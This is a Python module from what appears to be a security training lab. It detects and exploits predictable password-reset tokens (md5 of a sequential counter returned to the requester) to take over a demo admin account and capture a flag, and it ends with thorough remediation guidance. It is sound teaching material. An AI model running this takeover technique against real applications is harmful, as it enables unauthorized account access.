r"""Predictable password-reset tokens -> account takeover (weak randomness).

WHAT IT IS
----------
The demo app exposes a password-reset flow that, in the real-world code it
models, mints the reset token from a low-entropy, *recoverable* scheme instead
of a cryptographically-secure RNG. The lab models it faithfully in
:mod:`weblab.targetapp.weak_random`::

    # the server's token generator (recovered, e.g. from source / a leak):
    def token_for(counter: int) -> str:
        return md5(f"reset-token:{counter}".encode()).hexdigest()

    # POST /api/password-reset  {"username": "<u>"}  ->  issue():
    #     self.counter += 1                       # a GLOBAL, sequential counter
    #     token = token_for(self.counter)         # no secret, no real entropy
    #     store[username] = (self.counter, token)
    #     return {"reference": self.counter}      # <- the counter is HANDED BACK
    #                                                  (the token is NOT returned)

The fatal flaws: (1) the token is a pure function of a **sequential integer
counter** -- ``md5("reset-token:<n>")`` -- with **no secret key and no real
randomness**, so anyone who learns the scheme can compute any token from its
counter; and (2) the server **returns that counter** to the requester as a
"reference" number. An attacker therefore needs no email access at all: request
a reset for the *victim*, read the reference the server hands back, and compute
``token_for(reference)`` directly. The token is "secret" only in that it is not
echoed -- but it is fully predictable. (Even without the handed-back reference,
the counter is global and increments by 1 per request, so an attacker can
bracket the victim's value by requesting a reset of their *own* immediately
before/after and walking the tiny range.) The planted prize -- proof of admin
account takeover -- is :data:`C.FLAGS["weak_tokens"]`.

HOW WE DISCOVER IT
------------------
Two signals establish the weakness before we ever touch the admin account:

1.  **The reference is sequential / predictable (the structural tell).** We
    request several resets and observe the returned ``reference`` values form a
    contiguous, increment-by-1 sequence (1001, 1002, 1003 ...). A reset
    reference that an attacker can *count off* -- rather than an opaque
    128-bit random -- is the smoking gun for weak randomness.

2.  **We confirm our OWN reset with a PREDICTED token (the proof).** We POST a
    reset for ``"attacker"``, take the handed-back reference, compute
    ``token_for(reference)`` *locally* (never reading any email/SMS), and POST
    it to ``/api/password-reset/confirm``. A **200**/``reset`` response proves
    the token we *predicted from the reference alone* is the real one -- the
    generator is broken. As a control, a wrong/garbage token for the same
    username is rejected (**403**), proving the endpoint really validates the
    token (it is not an open door).

HOW WE EXPLOIT IT
-----------------
Account takeover of the **admin** with no admin secret or email access:

    POST /api/password-reset            {"username": "admin"}   -> {"reference": R}
    token = token_for(R)                # predicted offline from R alone
    POST /api/password-reset/confirm    {"username": "admin", "token": token}
                                        -> 200 {"flag": C.FLAGS["weak_tokens"]}

The 200 + flag is the takeover: we drove admin's reset to completion using a
token we computed, never possessing admin's mailbox. We recover the flag from
that response.

THE FIX
-------
See :data:`REMEDIATION`. In one line: generate reset tokens from a CSPRNG with
>=128 bits of entropy (never a counter/timestamp/predictable seed), store only a
hash of the token, bind it to the user + a short expiry + single use, deliver it
out-of-band, and NEVER return the token (or any value that derives it, like the
counter) to the requester.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C
from .targetapp.weak_random import token_for  # the recovered weak-token scheme

REMEDIATION: str = (
    "Generate password-reset tokens (and session ids, API keys, CSRF tokens -- "
    "any security value) from a CRYPTOGRAPHICALLY-SECURE RNG, never from a "
    "predictable source. The bug here is two-fold and both halves must be fixed: "
    "(1) the token is a pure function of a SEQUENTIAL counter with no secret and "
    "no entropy (md5('reset-token:'+n)), so it is fully predictable; and (2) the "
    "server HANDS BACK that counter as a 'reference', so an attacker can compute "
    "any user's token directly. Fixes: (a) Mint tokens with a CSPRNG and >=128 "
    "bits of entropy -- e.g. PHP random_bytes(32)/bin2hex, .NET "
    "RandomNumberGenerator.GetBytes / RandomNumberGenerator.GetHexString, "
    "Python secrets.token_urlsafe(32) -- NOT rand()/mt_rand(), a counter, a "
    "timestamp, an auto-increment id, or a seeded PRNG. (b) Store only a HASH of "
    "the token (e.g. SHA-256) server-side, compare with a constant-time equality "
    "(hash_equals / CryptographicOperations.FixedTimeEquals), and look the token "
    "up by its hash -- so a database leak does not expose live tokens. (c) BIND "
    "the token to the requesting user, make it SINGLE-USE (delete on confirm), and "
    "give it a SHORT expiry (e.g. 15-60 min). (d) Deliver it strictly OUT-OF-BAND "
    "(email/SMS to the registered address) and NEVER return the token, a "
    "'reference', a counter, or any value from which the token can be derived in "
    "the HTTP response. (e) Rate-limit and lock out repeated confirm attempts, and "
    "do not reveal whether a username exists. The same rule governs all "
    "security-sensitive randomness in any stack (PostgreSQL gen_random_uuid is for "
    "ids, not secrets): use a vetted CSPRNG, never a guessable scheme."
)

#: The reset endpoints under test (POST). The first issues a token and returns a
#: predictable ``reference`` (counter); the second validates a submitted token.
ENDPOINT: str = "/api/password-reset"
CONFIRM_ENDPOINT: str = "/api/password-reset/confirm"
HTTP_METHOD: str = "POST"

#: The username whose account we take over (the planted prize is admin's).
TARGET_USERNAME: str = "admin"

#: A username we control, used to PROVE token prediction works on our own reset
#: before we touch the victim's account.
ATTACKER_USERNAME: str = "attacker"

#: A deliberately-wrong token used as the detection control: it must be rejected
#: (403), proving the confirm endpoint genuinely validates the token.
CONTROL_WRONG_TOKEN: str = "00000000000000000000000000000000"

#: How many sequential references to sample when proving predictability.
_SEQUENCE_PROBES: int = 3

#: The payloads this module sends, for the report. The real "payload" is the
#: PREDICTED token computed from each handed-back reference via ``token_for``.
PAYLOADS: List[str] = [
    'POST /api/password-reset {"username": "attacker"}  -> read {"reference": R}',
    'token = token_for(R)   # md5("reset-token:R"), predicted OFFLINE from R alone',
    'POST /api/password-reset/confirm {"username": "attacker", "token": token}  -> 200',
    'POST /api/password-reset {"username": "admin"}  -> {"reference": R_admin}',
    'POST /api/password-reset/confirm {"username": "admin", "token": token_for(R_admin)}  -> FLAG',
]


# --- low-level probes --------------------------------------------------------
def _request_reset(client: WebClient, username: str) -> Response:
    """Drive ``POST /api/password-reset`` -> ``{"reference": <counter>}``."""
    return client.post(ENDPOINT, json={"username": username})


def _reference_of(resp: Response) -> Optional[int]:
    """Extract the handed-back sequential ``reference`` (counter), or ``None``."""
    if resp.status != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    ref = body.get("reference") if isinstance(body, dict) else None
    return ref if isinstance(ref, int) else None


def _confirm(client: WebClient, username: str, token: str) -> Response:
    """Drive ``POST /api/password-reset/confirm`` with a submitted token."""
    return client.post(CONFIRM_ENDPOINT, json={"username": username, "token": token})


def _confirmed(resp: Response, flag: str) -> bool:
    """True if a confirm succeeded (HTTP 200 carrying the planted flag)."""
    if resp.status != 200:
        return False
    if flag not in resp.text:
        return False
    try:
        body = resp.json()
    except ValueError:
        return True  # flag present even if body is not strict JSON
    return isinstance(body, dict) and body.get("status") == "reset"


# --- detection ---------------------------------------------------------------
def detect_sequential_references(
    client: WebClient, probes: int = _SEQUENCE_PROBES
) -> Tuple[bool, List[int], str]:
    """Structural tell: the returned ``reference`` values are sequential.

    Requests ``probes`` resets and checks the references form a contiguous,
    increment-by-1 integer sequence -- the signature of a counter-based (weak)
    token scheme rather than opaque 128-bit randomness. Returns
    ``(is_sequential, references, evidence)``.
    """
    refs: List[int] = []
    for _ in range(probes):
        ref = _reference_of(_request_reset(client, ATTACKER_USERNAME))
        if ref is None:
            return False, refs, ""
        refs.append(ref)
    # Contiguous and strictly increasing by exactly 1 each step.
    sequential = len(refs) >= 2 and all(
        b - a == 1 for a, b in zip(refs, refs[1:])
    )
    if sequential:
        evidence = (
            f"{HTTP_METHOD} {ENDPOINT} returned a contiguous, increment-by-1 "
            f"reference sequence {refs} -- a guessable counter, not an opaque "
            f"random token (weak randomness)"
        )
        return True, refs, evidence
    return False, refs, ""


def detect_predicted_token_confirms(
    client: WebClient,
) -> Tuple[bool, Optional[int], str, str]:
    """Proof: a token PREDICTED from the handed-back reference confirms our reset.

    Requests a reset for the attacker-controlled username, computes
    ``token_for(reference)`` *offline* (no email access), and confirms with it.
    A 200/``reset`` response proves the token is fully predictable from the
    reference alone. Returns ``(ok, reference, predicted_token, evidence)``.
    """
    flag = C.FLAGS["weak_tokens"]
    ref = _reference_of(_request_reset(client, ATTACKER_USERNAME))
    if ref is None:
        return False, None, "", ""
    predicted = token_for(ref)
    if _confirmed(_confirm(client, ATTACKER_USERNAME, predicted), flag):
        evidence = (
            f"predicted token_for({ref}) = {predicted} (md5('reset-token:{ref}'), "
            f"computed OFFLINE from the handed-back reference -- no mailbox access) "
            f"confirmed {ATTACKER_USERNAME!r}'s own reset (HTTP 200) -- the token "
            f"generator is fully predictable"
        )
        return True, ref, predicted, evidence
    return False, ref, predicted, ""


def detect_wrong_token_rejected(
    client: WebClient, token: str = CONTROL_WRONG_TOKEN
) -> Tuple[bool, str]:
    """Control: a wrong token is rejected (403), so confirm really validates it.

    Proves the confirm endpoint is not an open door -- so predicting the token
    later is a genuine takeover, not an unguarded reset.
    """
    flag = C.FLAGS["weak_tokens"]
    # Issue a fresh reset so the username has a pending (non-matching) token.
    _request_reset(client, ATTACKER_USERNAME)
    resp = _confirm(client, ATTACKER_USERNAME, token)
    if resp.status == 403 and flag not in resp.text:
        return True, (
            f"a wrong token ({token!r}) for {ATTACKER_USERNAME!r} was rejected "
            f"(HTTP {resp.status}, no flag) -- {CONFIRM_ENDPOINT} really validates "
            f"the token"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_admin_takeover(
    client: WebClient,
) -> Tuple[bool, Optional[str], Optional[int], str, str]:
    """Take over the admin account by predicting its reset token; recover the flag.

    Requests a reset for ``admin``, predicts ``token_for(reference)`` offline,
    and confirms it. Returns ``(ok, flag, reference, predicted_token, raw_body)``.
    """
    flag_value = C.FLAGS["weak_tokens"]
    ref = _reference_of(_request_reset(client, TARGET_USERNAME))
    if ref is None:
        return False, None, None, "", ""
    predicted = token_for(ref)
    resp = _confirm(client, TARGET_USERNAME, predicted)
    if _confirmed(resp, flag_value):
        return True, flag_value, ref, predicted, resp.text
    return False, None, ref, predicted, resp.text


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect predictable reset tokens, then take over admin (recover the flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["weak_tokens"]`` together with the predicted token and the
    reference it was derived from, with ``extra`` proving the takeover is real:
    references are sequential, a wrong token is 403, yet a token predicted from
    the handed-back reference confirms first our own and then admin's reset --
    without any email access.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    seq_ok, refs, seq_ev = detect_sequential_references(client)
    if seq_ok:
        techniques.append("sequential-references")

    control_ok, control_ev = detect_wrong_token_rejected(client)
    if control_ok:
        techniques.append("wrong-token-rejected-403")

    predict_ok, own_ref, own_token, predict_ev = detect_predicted_token_confirms(
        client
    )
    if predict_ok:
        techniques.append("predicted-own-reset-confirmed")

    # 2) Exploitation: admin account takeover -------------------------------
    ok, flag, admin_ref, admin_token, admin_body = exploit_admin_takeover(client)
    if ok:
        techniques.append("admin-takeover-flag")

    # Discovery requires the full chain: sequential references + a validating
    # endpoint (control 403) + a predicted token confirming our OWN reset +
    # the admin takeover recovering the flag. This rules out an open door
    # (control would not be 403) and a non-predictable scheme (predict/exploit
    # would not confirm).
    discovered = bool(seq_ok and control_ok and predict_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if seq_ok:
        evidence_parts.append(f"sequence: {seq_ev}")
    if control_ok:
        evidence_parts.append(f"control: {control_ev}")
    if predict_ok:
        evidence_parts.append(f"predict: {predict_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result: Dict[str, object] = {
        "flag": flag,
        "target_username": TARGET_USERNAME,
        "admin_reference": admin_ref,
        "predicted_admin_token": admin_token,
        "admin_confirm_body": admin_body,
        "own_username": ATTACKER_USERNAME,
        "own_reference": own_ref,
        "predicted_own_token": own_token,
        "sampled_references": refs,
        "control_wrong_token": CONTROL_WRONG_TOKEN,
        "scheme": "md5('reset-token:'+<sequential-counter>)",
        "techniques": techniques,
        "summary": (
            f"references from {HTTP_METHOD} {ENDPOINT} are sequential ({refs}); a "
            f"wrong token is rejected 403, yet token_for(reference) -- computed "
            f"OFFLINE as md5('reset-token:'+reference) with no mailbox access -- "
            f"confirmed {ATTACKER_USERNAME!r}'s own reset (reference {own_ref}) and "
            f"then took over {TARGET_USERNAME!r} (reference {admin_ref}, predicted "
            f"token {admin_token}), recovering flag {flag!r} -- account takeover via "
            f"predictable random tokens"
        ),
    }

    return Finding(
        vuln="Weak Random Token (predictable reset token -> account takeover)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=admin_token or "",
        extra={
            "techniques": techniques,
            "sequential_references": seq_ok,
            "sampled_references": refs,
            "control_rejected": control_ok,
            "control_status": 403,
            "control_wrong_token": CONTROL_WRONG_TOKEN,
            "own_reset_predicted": predict_ok,
            "own_username": ATTACKER_USERNAME,
            "own_reference": own_ref,
            "predicted_own_token": own_token,
            "admin_takeover": ok,
            "target_username": TARGET_USERNAME,
            "admin_reference": admin_ref,
            "predicted_admin_token": admin_token,
            "flag_recovered": ok,
            "confirm_endpoint": CONFIRM_ENDPOINT,
            "scheme": "md5('reset-token:'+<sequential-counter>)",
        },
    )
